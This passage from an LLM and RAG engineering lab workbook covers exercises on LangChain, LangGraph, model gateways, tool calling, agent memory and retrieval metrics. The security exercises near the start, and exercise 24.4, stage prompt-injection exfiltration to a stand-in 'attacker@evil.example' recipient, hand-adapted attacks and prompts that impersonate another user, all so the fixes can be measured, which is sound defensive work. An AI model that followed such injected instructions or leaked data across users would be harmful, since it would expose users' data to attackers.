    `attacker@evil.example`. Measure how often it calls the tool with that address. Then allow a
    recipient only if it appears in the user's own message (a taint check in the tool executor).
  - **Predict:** ASR before and after.
  - **Verify:** after the fix, 0 of 40 by construction, whatever the model outputs.
- [ ] **17.4 The attacker moves second** *(Level: Stretch)*
  - **Goal:** §4.7: a fixed probe list is a floor on risk.
  - **Do:** spend 30 minutes adapting attacks against 17.2's full stack by hand.
  - **Verify:** ASR of your best 10 attacks vs 17.2's final ASR.
- [ ] **17.5 PII: regex vs regex + validation** *(Level: Stretch)*
  - **Do:** 200 strings: valid card numbers, random 16-digit numbers, phones, order IDs. Detect cards
    with a bare regex, then regex + Luhn (§8.2).
  - **Verify:** precision and recall for each.

**Also do:** §19 Labs 4 (tool-call authorization) and 6 (end-to-end defense in depth).

**Checkpoint (closed book):**
1. State the Agents Rule of Two.
2. Why is indirect injection harder than direct injection?
3. Fail open or fail closed when a guardrail times out, and why?
<details><summary>Answers</summary>

1. In one session an agent may have at most two of: untrusted input, access to sensitive data, the ability to change state or communicate externally. RAG always has untrusted input, so all three together need human approval on the action.
2. It arrives through retrieved content, bypassing input validation on the user's query. The corpus is untrusted input.
3. Closed. A false positive is an inconvenience; a false negative is a security incident.
</details>

---

## 20 — LangChain architecture and internals  ([chapter](20-langchain-architecture-and-internals.md))
**Time:** ~3 h · **Needs:** `langchain-core`, `langchain-classic`, `langchain-community`, `langchain-ollama`, SciFact

- [ ] **20.1 The pipe builds a data structure** *(Level: Core)*
  - **Goal:** §3–§4: nothing runs until `invoke`.
  - **Do:** `chain = prompt | ChatOllama(model="llama3.2:3b") | StrOutputParser()`. Print
    `type(chain)` and `chain.steps`. Attach a callback handler that counts `on_chat_model_start`.
  - **Predict:** model calls after construction; after `invoke`; after `batch` of 5.
  - **Verify:** the counter matches each prediction; explain any mismatch from §3's `batch` default.
- [ ] **20.2 Break it: framework defaults are the rank-window trap** *(Level: Core)*
  - **Goal:** connect §7 to `04` §5.4.
  - **Do:** on SciFact, build `EnsembleRetriever` (from `langchain_classic.retrievers`, or
    `langchain.retrievers` on 0.3) over `BM25Retriever.from_texts(...)` and a FAISS vector store with
    bge-small, all defaults. Then set each branch's `k=100` and give BM25 04.1(b)'s `preprocess_func`.
  - **Predict:** candidates per query and recall@100 with defaults.
  - **Verify:** both configurations against your 04.2 RRF numbers. Name the two defaults responsible.
- [ ] **20.3 `batch` concurrency against a local model** *(Level: Core)*
  - **Goal:** §3: `batch` is `invoke` on a thread pool.
  - **Do:** 20 inputs with `config={"max_concurrency": n}` for n in {1, 2, 4}, and Ollama started
    with `OLLAMA_NUM_PARALLEL` at 1, then 4.
  - **Predict:** throughput at each (n, parallel) pair.
  - **Verify:** a 3 × 2 table; say where the bottleneck sits.
- [ ] **20.4 Fallbacks and retries in the Runnable** *(Level: Stretch)*
  - **Do:** `ChatOllama(base_url="http://localhost:9").with_fallbacks([ChatOllama(model="qwen2.5:3b")])`.
  - **Verify:** added latency of the failover, and what the trace shows about which model answered.

**Also do:** §17 Labs 1 (hand-written loop vs prebuilt), 2 (break streaming) and 9 (authorization-filtered branch).

**Checkpoint (closed book):**
1. What does `a | b | c` produce?
2. How does one `RunnableLambda` break streaming?
3. What does `EnsembleRetriever` compute?
<details><summary>Answers</summary>

1. A `RunnableSequence` with `steps = [a, b, c]`. Nothing executes until `invoke`, `batch` or `stream`.
2. A non-generator step must receive its whole input before emitting, so everything downstream waits. Streaming needs `transform` as a generator at every step.
3. Weighted reciprocal rank fusion over each retriever's ranked list (`c = 60`).
</details>

---

## 21 — LangGraph deep dive  ([chapter](21-langgraph-deep-dive.md))
**Time:** ~4 h · **Needs:** `langgraph`, `langgraph-checkpoint-postgres`, Postgres, Ollama

Count executions in a side table outside the graph (`INSERT INTO node_runs(node, ts)` at the top of
each node), so a resumed run cannot hide re-execution from you.

- [ ] **21.1 Checkpoint, kill -9, resume** *(Level: Core)*
  - **Goal:** §5.1–§5.3 with the cost of recovery measured.
  - **Do:** linear graph `retrieve → grade → rewrite → retrieve2 → generate`, each node sleeps 3 s.
    Compile with `PostgresSaver` (`setup()` once) and a fixed `thread_id`. `kill -9` during
    `retrieve2`. In a new process, `graph.invoke(None, config)`.
  - **Predict:** executions per node after the resume, and checkpoint rows for the thread.
  - **Verify:** `node_runs` counts, the checkpoint row count (`\dt checkpoint*` lists the tables),
    and the final answer. State which work a `MemorySaver` would have lost.
- [ ] **21.2 Partial failure inside a super-step** *(Level: Core)*
  - **Goal:** §5.6: completed sibling writes are kept, so only the failed node re-runs.
  - **Do:** fan out `a`, `b`, `c` from `START`, each appending to `results: Annotated[list, operator.add]`.
    `c` raises on its first run (a flag file). Resume with `invoke(None, config)`.
  - **Predict:** executions of `a`, `b`, `c`, and `len(results)`.
  - **Verify:** `node_runs` and the final state.
- [ ] **21.3 Checkpoint storage growth** *(Level: Core)*
  - **Goal:** §5.6–§5.7: what the checkpointer costs in bytes.
  - **Do:** a 50-turn chat on one thread with `add_messages`. After each turn record
    `pg_total_relation_size` of each checkpoint table.
  - **Predict:** linear or superlinear total growth with turns.
  - **Verify:** the curve, bytes per turn at turns 10 and 50, and a pruning rule you would ship.
- [ ] **21.4 Corrective RAG with a bounded loop** *(Level: Stretch)*
  - **Goal:** §4 and §12 on a real retrieval task.
  - **Do:** grade the top-5 with `qwen2.5:3b` (yes/no). If none pass, rewrite and retry, at most twice.
    Run 100 FiQA queries.
  - **Predict:** nDCG@10 change vs single-shot, and LLM calls per query.
  - **Verify:** both numbers, and how many queries hit the bound.

**Also do:** §19 Labs 2 (reducer failure), 4 (interrupt idempotency), 7 (cost ceilings) and 11 (state-schema migration).

**Checkpoint (closed book):**
1. When is a checkpoint written, and what is the unit of persistence?
2. Two parallel nodes write the same list field with no reducer. What happens?
3. After `interrupt()` and a resume, what re-executes?
<details><summary>Answers</summary>

1. After every super-step, per `thread_id`.
2. `InvalidUpdateError`. Declare a reducer such as `Annotated[list, operator.add]` or `add_messages`.
3. The whole node that called `interrupt()`, from its first line. Side effects before the call run twice (§6.2).
</details>

---

## 22 — Agent orchestration patterns  ([chapter](22-agent-orchestration-patterns.md))
**Time:** ~4 h · **Needs:** Ollama tool calling (`qwen2.5:3b`), your 04 retriever, golden set

- [ ] **22.1 ReAct vs Plan-and-Execute on two-hop questions** *(Level: Core)*
  - **Goal:** §3.2–§3.3 and §3.6 with a small model.
  - **Do:** 20 two-hop questions over the ai-rag chapters (the golden set's multi-hop records plus
    ones you write, such as "pgvector's default `ef_search` and the RRF `k` Elasticsearch uses").
    Tools: `search(query)`, `read_chunk(id)`. Build both loops with a 10-step cap.
  - **Predict:** success rate and mean LLM calls for each.
  - **Verify:** both, graded against expected answers you wrote first.
- [ ] **22.2 Tool-selection accuracy vs tool count** *(Level: Core)*
  - **Goal:** §7.2 and §14.3.
  - **Do:** 30 tasks with a labelled correct first tool. Offer 4 tools, then the same 4 plus 8
    distractors with similar descriptions. Then add §7.2's top-4 tool retrieval over all 12.
  - **Predict:** accuracy with 4, 12, and 12-with-retrieval.
  - **Verify:** 3 accuracies and prompt tokens per call.
- [ ] **22.3 The cost tail of a bounded loop** *(Level: Core)*
  - **Goal:** §4.2–§4.3 and §10.5: termination conditions decide the tail.
  - **Do:** 50 tasks with a flaky tool (30% error, or the same useless result). Run with only a
    12-step cap, then add a token budget and a stuck-loop detector (same tool and args 3 times).
  - **Predict:** p95 tokens per task in each configuration.
  - **Verify:** p50/p95/max tokens and steps; termination reasons counted.
- [ ] **22.4 Explain it: workflow first** *(Level: Stretch)*
  - **Goal:** a half-page design note to an engineering manager, using 22.1–22.3's numbers,
    recommending which paths stay code and which get an agent (§2).

**Also do:** §17 Labs 3 (supervisor with trajectory eval), 4 (crash-recoverable state) and 7 (replay regression suite).

**Checkpoint (closed book):**
1. List §4.3's seven termination conditions.
2. When is a workflow the right choice over an agent?
3. Why does a refund tool need an idempotency key?
<details><summary>Answers</summary>

1. Explicit success, max iterations, token budget, wall-clock timeout, stuck-loop detection, human interrupt, irrecoverable tool failure (breaker open).
2. Whenever the steps can be written down in advance. Use an agent only for the part whose path can't be (§2).
3. Timeouts and retries re-execute calls. A key derived from the ticket makes the duplicate a no-op.
</details>

---

## 23 — Multi-LLM model gateway  ([chapter](23-multi-llm-model-gateway.md))
**Time:** ~4 h · **Needs:** `labs/llm-resilience` (zero deps), FastAPI, httpx, Ollama

- [ ] **23.1 Run labs/llm-resilience first** *(Level: Core)*
  - **Goal:** the capacity arithmetic and the 429 rule before you write a gateway.
  - **Do:** `cd labs/llm-resilience && python3 run.py capacity breaker retries && python3 test_resilience.py`.
  - **Predict:** before `breaker`, how many of 200 calls get refused when 429s count as breaker failures.
  - **Verify:** the Act 4 table. Then do its README §9 exercise 3.
- [ ] **23.2 Fallback under an injected 429** *(Level: Core)*
  - **Goal:** §5.1–§5.5 against real HTTP.
  - **Do:** a chaos stub: FastAPI `POST /v1/chat/completions` that returns 429 with `Retry-After: 2`
    with probability p, otherwise proxies to Ollama's `/v1` with `llama3.2:3b`. Secondary: Ollama
    `qwen2.5:3b` directly. Your gateway: §5.1's `ChainExecutor` and §5.2's `CircuitBreaker` over
    httpx. 200 requests at concurrency 8, p in {0, 0.2, 0.5, 1.0}.
  - **Predict:** success rate at p = 1.0, and whether the primary's breaker opens at p = 0.5.
  - **Verify:** per p: success %, share served by fallback (`fallback_depth`), p95 latency, breaker
    transitions. §5.2's breaker counts every exception, 429 included. Make it ignore
    `RateLimitedError`, honour `Retry-After`, re-run, and compare.
- [ ] **23.3 A 400 must not fall back** *(Level: Core)*
  - **Goal:** §5.1's `except ProviderBadRequestError: raise`.
  - **Do:** make the stub return 400 for one request shape. Send 20.
  - **Predict:** fallback count and latency.
  - **Verify:** 0 fallbacks, the error surfaces unchanged, the breaker does not move.
- [ ] **23.4 Timeout budget across hops** *(Level: Stretch)*
  - **Goal:** §5.4.
  - **Do:** the stub adds 20 s latency on both targets. Compare a 15 s per-hop timeout with a 20 s
    whole-chain budget split across hops.
  - **Predict:** worst-case caller latency for each.
  - **Verify:** measured worst case vs your SLO.
- [ ] **23.5 Compare with LiteLLM** *(Level: Stretch)*
  - **Do:** `uv pip install litellm`, then `litellm.Router(model_list=..., fallbacks=[{"primary": ["backup"]}])` against the same stub at p = 0.5.
  - **Verify:** the same four numbers as 23.2, side by side with yours.

**Also do:** §17 Labs 4 (reserve-then-settle limiter), 5 (tenant cost ledger) and 6 (settlement on disconnect).

**Checkpoint (closed book):**
1. Why must a 400 not trigger fallback?
2. Should a 429 count toward the circuit breaker?
3. Why one breaker per (provider, model) and not per provider?
<details><summary>Answers</summary>

1. It fails the same way on every provider, wastes the fallback budget and hides the real error behind "all providers failed".
2. No. It is a quota signal from a healthy dependency; counting it opens the breaker on a working API. Handle quota with a client-side limiter and `Retry-After` (llm-resilience Act 4).
3. Outages are often specific to one model deployment (§5.2).
</details>

---

## 24 — Tool calling and enterprise integration  ([chapter](24-tool-calling-and-enterprise-integration.md))
**Time:** ~4 h · **Needs:** `labs/tool-registry` (zero deps), Ollama tool calling, Pydantic v2

- [ ] **24.1 Run labs/tool-registry, predict the evolution verdicts** *(Level: Core)*
  - **Goal:** §5.2's versioning rule, as the lab's compatibility checker enforces it.
  - **Do:** `cd labs/tool-registry && python3 run.py validation evolution && python3 test_registry.py`.
  - **Predict:** before running, which are breaking: optional field added, maximum raised, required
    field added, maximum lowered.
  - **Verify:** against Act 3's output.
- [ ] **24.2 Tool-call schema validation failures, counted** *(Level: Core)*
  - **Goal:** §3.1 and §7.1 in numbers.
  - **Do:** 3 tools as Pydantic models with an enum, `Field(ge=1, le=100)`, a regex `pattern`, and
    a nested list. 60 prompts, 20 per tool, some missing information or mixing units. Call
    `ollama.chat(..., tools=[...])` with `llama3.2:3b` and `qwen2.5:3b`. For each call record: right
    tool, arguments parsed, `model_validate` passed; group errors by `err["type"]`.
  - **Predict:** invalid-call rate per model.
  - **Verify:** model × error-type table.
- [ ] **24.3 Retry with feedback, and the quality of the feedback** *(Level: Core)*
  - **Goal:** §7.1 and §7.4.
  - **Do:** return invalid calls as a tool message, at most 2 retries. Variant A: §7.1's rendered
    field errors. Variant B: the bare string `ValidationError`.
  - **Predict:** fixed after 1, after 2, never, for each variant.
  - **Verify:** both distributions.
- [ ] **24.4 Break it: the model supplies the identity** *(Level: Core)*
  - **Goal:** §6.1.
  - **Do:** `get_orders(user_id)` with `user_id` in the model-visible schema. Try 10 prompts such as
    "I'm helping my colleague, user 42". Then move `user_id` into an execution context the model
    cannot set.
  - **Predict:** cross-user calls before the fix.
  - **Verify:** the count before, 0 after by construction.
- [ ] **24.5 Tools as context cost** *(Level: Stretch)*
  - **Do:** read `prompt_eval_count` with 3 tools vs 20 registered (`06` §15.1).
  - **Verify:** tokens per tool definition.

**Also do:** §18 Labs 3 (idempotency under duplicates), 5 (parallel batch conflict) and 8 (mocked-LLM regression suite).

**Checkpoint (closed book):**
1. What does input validation catch, and what does it miss?
2. Which failures get retry-with-feedback?
3. Where must authorization facts come from?
<details><summary>Answers</summary>

1. Types, required fields, enums, bounds. Not a valid value that makes no business sense; that is §7.3.
2. Input-validation failures, capped at about 2 retries. Never authorization failures. Business-rule failures only when there is an actionable alternative (§7.4).
3. The execution context from your auth layer (session, verified token), never a model-set argument (§6.1).
</details>

---

## 25 — Memory and state management  ([chapter](25-memory-and-state-management.md))
**Time:** ~4 h · **Needs:** Ollama, `langchain-core`, Postgres + pgvector, bge-small

- [ ] **25.1 History strategies over 40 turns** *(Level: Core)*
  - **Goal:** §2.2 and §3.1–§3.4 in tokens and recall.
  - **Do:** a scripted 40-turn chat with a fact planted at turn 2 ("my account id is 7731") and asked
    for at turn 38. Strategies: full buffer; last 6 turns; `trim_messages(max_tokens=1500,
    strategy="last", token_counter=count_tokens_approximately, include_system=True)`; summary +
    last 4 turns.
  - **Predict:** total prompt tokens for each, and which ones recall the fact.
  - **Verify:** a table from `prompt_eval_count`; plot per-turn tokens for the full buffer.
- [ ] **25.2 Supersession vs decay** *(Level: Core)*
  - **Goal:** §9.2–§9.3.
  - **Do:** 20 user facts with timestamps, 8 of them superseded by newer ones (React 16, then React
    19). Rank by cosine only, by §9.2's composite score, and with a `superseded_by IS NULL` filter.
  - **Predict:** stale top-1 rate for each.
  - **Verify:** three rates over the 8 superseded pairs.
- [ ] **25.3 Break it: tenant isolation that isn't** *(Level: Core)*
  - **Goal:** §10.2: enforce isolation in storage, not in application code.
  - **Do:** a `memory(user_id, fact, emb vector(384))` table and a retrieval path that forgets the
    `user_id` filter. Add `ENABLE ROW LEVEL SECURITY` with a policy on
    `current_setting('app.user_id')`. Run the buggy path as `postgres`, then as a non-owner role.
  - **Predict:** foreign rows returned in each case.
  - **Verify:** counts. Explain the first (superusers and table owners bypass RLS unless `FORCE ROW LEVEL SECURITY`).
- [ ] **25.4 Where a forgotten fact survives** *(Level: Stretch)*
  - **Goal:** §10.4 across backends.
  - **Do:** delete a user's facts from `memory`, then search the LangGraph checkpoint tables from
    21.3 and your logs for the fact string.
  - **Verify:** a list of every place it still exists, and a delete procedure that covers them.

**Also do:** §17 Labs 3 (reducer failure in shared memory), 4 (fact extraction with supersession) and 8 (lazy schema migration).

**Checkpoint (closed book):**
1. What are the three kinds of memory?
2. Why is a full-history buffer quadratic in total cost?
3. Why is supersession better than decay alone?
<details><summary>Answers</summary>

1. Conversation history, agent state, long-term memory (§1).
2. Every turn re-sends all previous turns, so the total over n turns grows with n².
3. Decay only uses time and is blind to contradictions, so a stale fact can still rank first. Marking it superseded at write time removes it.
</details>

---

## Appendix D — Document-processing benchmarks  ([chapter](appendix-d-doc-processing-benchmarks.md))
**Time:** ~2 h · **Needs:** `labs/document-processing` bake-off deps, golden corpus

- [ ] **D.1 Run the bake-off on the fixtures** *(Level: Core)*
  - **Goal:** §3.3: benchmarks miss failure distribution and silent garbage.
  - **Do:** `cd labs/document-processing && uv venv .venv && uv pip install -r requirements-bakeoff.txt && .venv/bin/python bakeoff.py`.
  - **Predict:** which libraries emit mojibake on `subset_broken.pdf` without failing, and which
    return nothing for `scan.pdf`.
  - **Verify:** against the output and the lab README §5.
- [ ] **D.2 Characters, not tokens** *(Level: Core)*
  - **Goal:** §16.2's incident on your corpus.
  - **Do:** split the golden corpus with `RecursiveCharacterTextSplitter(chunk_size=512)` and with
    `from_huggingface_tokenizer(tok, chunk_size=512)`.
  - **Predict:** mean tokens per chunk and chunk count for the character version.
  - **Verify:** both, plus recall@5 on the golden set for each at a fixed token budget.
- [ ] **D.3 Explain it: pick a stack** *(Level: Stretch)*
  - **Goal:** a half-page note to a startup CTO choosing from §12.2, citing only numbers you measured.

**Checkpoint (closed book):**
1. Name three things parser benchmarks do not capture.
2. Why is a parser that fails loudly better than one that fails silently?
3. What is a benchmark for, if not the decision?
<details><summary>Answers</summary>

1. Any three of: table structure fidelity, failure-mode distribution, header/footer injection, throughput at scale, determinism (§3.3).
2. Empty output can be caught by a yield gate; plausible garbage fills the index with confident wrong answers.
3. A shortlist of what to test on your own documents (§14).
</details>

---

## Appendix E — Deployment and compute  ([chapter](appendix-e-deployment-and-compute.md))
**Time:** ~3 h · **Needs:** Ollama, Docker Compose

- [ ] **E.1 KV-cache arithmetic, then measure it** *(Level: Core)*
  - **Goal:** §7.2.1 on the models you run.
  - **Do:** read layers, KV heads and head dim from `ollama show -v` for both models. Compute
    `KV_per_token = 2 × layers × kv_heads × head_dim × 2 B`. Load each with `num_ctx` 2048, then
    16384, and read memory from `ollama ps` (`OLLAMA_NUM_PARALLEL=1`).
  - **Predict:** the memory delta per model, and which model has the smaller KV cache.
  - **Verify:** predicted vs measured deltas.
- [ ] **E.2 Prefill vs decode** *(Level: Core)*
  - **Goal:** §7.2.2: RAG is prefill-heavy.
  - **Do:** prompts of 500, 1,000, 2,000 and 4,000 tokens, 200 output tokens. Record
    `prompt_eval_duration` and `eval_duration`.
  - **Predict:** at 4,000 in / 200 out, which phase takes longer.
  - **Verify:** prefill and decode tokens/s, and the phase split at each size.
- [ ] **E.3 A healthcheck that checks the index** *(Level: Core)*
  - **Goal:** §4.1.
  - **Do:** replace `pg_isready` with a query that must return a known nearest neighbour. Run
    `TRUNCATE doc` and compare `docker inspect --format '{{.State.Health.Status}}'` for both checks.
  - **Verify:** `pg_isready` stays healthy; yours goes unhealthy.
- [ ] **E.4 Break-even with your numbers** *(Level: Stretch)*
  - **Do:** apply §9.4's formula to your capstone workload at 20%, 60% and 90% utilization, with one
    current API price and one GPU price you look up.
  - **Verify:** three break-even volumes, and the engineer term's share.

**Checkpoint (closed book):**
1. For RAG, should you choose a GPU by weight size or by KV budget?
2. Why is RAG prefill-bound, and what prompt order helps prefix caching?
3. What must a RAG healthcheck test?
<details><summary>Answers</summary>

1. KV budget. Prompts are 2k–8k tokens and KV grows with context × concurrency (§7.2.1).
2. High input:output ratio. System prompt first, retrieved context after it (§7.2.2).
3. A known query against the index, not an open port (§4.1).
</details>

---

## Appendix F — Recall at every layer  ([chapter](appendix-f-recall-at-every-layer.md))
**Time:** ~3 h · **Needs:** 02–04 and 07 outputs, golden set

- [ ] **F.1 The leak report for your pipeline** *(Level: Core)*
  - **Goal:** §5: find the stage that loses the most.
  - **Do:** for each golden question, record booleans for `chunked` (union coverage ≥ 0.8),
    `exact_top50`, `ann_top50` (hnswlib, `ef=16` on purpose), `fused_top50`, `reranked_top5`,
    `in_prompt` (1,500-token budget) and `answer_correct` (07.1(c)). Print §5's `leak_report`.
  - **Predict:** the stage with the largest loss.
  - **Verify:** the table, and your next week's work named from it.
- [ ] **F.2 Three answers for every recall** *(Level: Core)*
  - **Goal:** §1.
  - **Do:** for 5 "recall" numbers in your notebook, write the unit, the answer key, and the list with its `k`.
  - **Verify:** every number has all three, or you strike it.

**Checkpoint (closed book):**
1. What three answers define any recall number?
2. Why measure the embedding stage with exact search?
3. When are hit rate@k and recall@k the same number?
<details><summary>Answers</summary>

1. Recall of what (unit), against which answer key, found where (the list and its `k`).
2. Otherwise index loss and embedding loss merge into one number.
3. When every question has exactly one right item.
</details>

---

## Appendix G — Ranking and answer metrics  ([chapter](appendix-g-ranking-and-answer-metrics.md))
**Time:** ~2 h · **Needs:** Python, `ranx`, SciFact runs

- [ ] **G.1 One list, every metric, three ways** *(Level: Core)*
  - **Goal:** §2.
  - **Do:** on paper, then in your own functions, compute §2's list (`D5 D3 D9 D7 D2`, grades
    3/2/1): recall@5, precision@5, RR, AP, nDCG@5 with exponential, linear and binary gain. Then
    score the same list with `ranx`.
  - **Predict:** which nDCG variant `ranx`'s `ndcg@5` computes.
  - **Verify:** yours match 1.0, 0.4, 0.5, 0.5, 0.71, 0.79, 0.65; `ranx` matches one of the nDCGs.
- [ ] **G.2 Macro vs micro, pp vs %** *(Level: Core)*
  - **Goal:** §7.1–§7.2.
  - **Do:** macro and micro recall@100 for your 04.2 dense and RRF runs on SciFact (some queries have
    several relevant docs). State the delta in pp and in %.
  - **Verify:** 4 numbers and 2 correctly worded deltas.
- [ ] **G.3 κ of a lazy judge** *(Level: Core)*
  - **Do:** 100 human labels with 90 passes; a judge that always says pass. Compute accuracy and κ.
  - **Predict:** both. **Verify:** `cohen_kappa_score` agrees with your prediction.

**Checkpoint (closed book):**
1. Why are rerankers measured with nDCG and MRR rather than recall at fusion depth?
2. Recall goes from 0.70 to 0.77. State the change.
3. A judge passes everything; humans pass 90 of 100. Accuracy and κ?
<details><summary>Answers</summary>

1. A reranker reorders a fixed set, so recall at that depth cannot change (§2).
2. +7 pp, or +10% relative (§7.2).
3. 0.90 and κ = 0 (§7.3).
</details>

---

## Appendix H — GraphRAG  ([chapter](appendix-h-graphrag.md))
**Time:** ~4 h · **Needs:** your 04 pipeline, Ollama `qwen2.5:3b`, golden corpus

- [ ] **H.1 Find the global slice** *(Level: Core)*
  - **Goal:** §1, §5 and §7: label query types before building a graph.
  - **Do:** tag 30 golden-set questions as local, multi-hop, global or aggregation, and write 5
    global questions over the ai-rag corpus (for example "which anti-patterns recur across 01–04?").
    Write 5 nuggets per global question before running anything. Answer with your hybrid top-10.
  - **Predict:** nugget recall on the global questions vs answer correctness on the local ones.
  - **Verify:** both numbers per slice.
- [ ] **H.2 Index cost, as arithmetic** *(Level: Core)*
  - **Do:** count tokens in the golden corpus and in FiQA; run §3's `graphrag_index_cost`, plus a
    weekly full re-index over a year.
  - **Verify:** three costs per corpus, and the ratio you would quote.
- [ ] **H.3 RAPTOR-lite** *(Level: Stretch)*
  - **Goal:** §2's cheapest global answer.
  - **Do:** k-means (k ≈ 20) over chunk vectors; summarize each cluster with `qwen2.5:3b`; index the
    summaries next to the chunks. Give each chunk a random ACL and compute §6's `summary_readers`.
  - **Predict:** nugget-recall gain on global questions, change on local ones.
  - **Verify:** both, the LLM tokens spent indexing, and how many summaries nobody may read.

**Checkpoint (closed book):**
1. Which two query types can top-k not answer, and which third type is not a graph problem?
2. Who may read a community summary?
3. What did GraphRAG-Bench find on simple fact retrieval?
<details><summary>Answers</summary>

1. Global/sensemaking and multi-hop over entities. Aggregation over structured facts belongs to SQL or Cypher on the real database.
2. The intersection of the readers of all its sources (§6).
3. Vanilla RAG was equal or better; graph methods raised evidence recall but cut context relevance (§4).
</details>

---

## Capstone projects

Each takes 1–3 days on a laptop and reuses your harness. Record every number with its dataset, n and
hit rule.

**C1 — Retrieval service with a regression gate (P0 + P1).** *(01–04, 08, F, G)*
- **Spec:** FastAPI `POST /search` doing BM25 (tuned analyzer) and bge-small in pgvector HNSW in
  parallel, RRF, then a cross-encoder over the fused top-50. Every response logs `branch_depth`,
  `fusion_depth`, `final_k`, `ef_search` and model names (`04` §6.3). An eval job writes per-query
  rows to DuckDB for SciFact and FiQA. A pytest gate fails when the paired-bootstrap lower bound of
  Δ nDCG@10 against the stored baseline is below −0.01.
- **Acceptance:** the gate fails on a deliberate regression (revert to `text.split()` BM25) and passes
  on a no-op change (a different batch size). Hybrid + rerank beats the best single branch with an
  interval that excludes 0. `ef_search ≥ k` is asserted.
- **Measure:** nDCG@10, recall@100, per-stage p50/p95 at concurrency 4, index size, and the F.1 leak report.

**C2 — Grounded, defended answer API.** *(06, 07, 08, 17)*
- **Spec:** C1 plus generation with 07's schema, a token budget from 06, 17.2's defenses and 17.3's
  code-level tool policy, and an abstain path. A judge validated to κ ≥ 0.7 on at least 100 of your
  own labels scores faithfulness.
- **Acceptance:** citation validity (existing `chunk_id`, verbatim quote) ≥ 95%; abstention recall ≥
  80% on 30 unanswerable questions with over-refusal ≤ 10%; ASR 0 on the exfiltration types by
  construction; benign false-positive rate reported.
- **Measure:** faithfulness, citation validity, abstention precision and recall, ASR per type,
  tokens and latency per answer.

**C3 — Durable research agent behind a gateway.** *(21–25, 23)*
- **Spec:** a LangGraph agent with tools `search`, `read_chunk` and a mock `send_report`, a
  `PostgresSaver`, an `interrupt()` approval before `send_report` with an idempotency key, long-term
  memory with supersession and row-level security, and every LLM call routed through your 23.2
  gateway with the chaos stub as primary.
- **Acceptance:** `kill -9` at any node and a resume produce no duplicate `send_report`; at p = 0.5
  injected 429s, task success drops by less than 5 pp from p = 0; one user never retrieves another
  user's memory, even through the buggy path from 25.3.
- **Measure:** on 30 tasks: success rate, steps and tokens p50/p95, cost per resolved task at a
  stated price, fallback share, and checkpoint bytes per task.
